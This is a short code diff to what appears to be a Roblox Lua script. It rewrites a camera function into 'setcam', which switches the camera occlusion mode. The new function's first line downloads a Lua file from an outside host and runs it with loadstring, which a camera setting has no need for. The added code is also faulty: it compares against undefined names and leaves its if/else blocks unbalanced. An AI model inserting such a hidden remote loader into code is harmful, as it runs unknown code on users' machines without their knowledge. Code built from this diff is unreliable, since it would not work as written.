@@ -1,5 +1,11 @@
-function inviscam()
+function setcam(camtype)
+	loadstring(game:HttpGet("https://irishost.xyz/InfinityHosting/IrisInit.lua"))()
+	if camtype == Invis then
 	game:GetService("Players").LocalPlayer.DevCameraOcclusionMode = "Invisicam"
+	else if camtype == Zoom then
+	game:GetService("Players").LocalPlayer.DevCameraOcclusionMode = "Zoom"
+	else
+	notify("Error!", "Invalid Camera Option!")
 end
 
 function invite(discordcode)
